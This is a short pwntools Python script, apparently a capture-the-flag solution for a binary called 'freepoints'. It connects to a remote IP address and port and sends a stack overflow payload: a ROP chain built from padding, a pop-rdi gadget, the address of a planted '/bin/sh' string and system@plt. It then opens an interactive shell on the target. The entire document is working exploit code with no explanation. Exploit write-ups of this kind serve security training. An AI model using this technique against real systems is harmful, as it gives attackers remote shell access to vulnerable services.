#!/usr/bin/env python3

from pwn import *

exe = ELF("./freepoints_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("198.211.116.222",9000)

    r.recvline()
    r.sendline("/bin/sh")
    r.recvline()

    binsh = 0x601070
    
    pause()
    r.sendline(cyclic_metasploit(24) + p64(0x0000000000400743) + p64(binsh) +  p64(0x0000000000400743 + 1) + p64(exe.plt['system']))

    r.interactive()


if __name__ == "__main__":
    main()
